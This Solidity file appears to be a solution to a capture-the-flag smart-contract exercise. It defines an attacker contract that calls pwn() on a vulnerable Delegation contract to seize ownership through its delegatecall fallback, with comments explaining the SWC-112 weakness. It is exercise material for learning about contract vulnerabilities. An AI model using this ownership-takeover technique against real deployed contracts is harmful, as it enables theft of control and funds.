// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";
import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        Delegation delegationContract = Delegation(contractAddress);
        // https://swcregistry.io/docs/SWC-112
        // had it as delegatecall before but that just attepmted to set the owner of this contract
        // since msg.sender doesnt change in a delegatecall, pwn gets this contract address
        // as msg.sender and uses the storage of delegationContract
        (bool success,) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
        console.log("hackContract success is %s", success);
    }
}
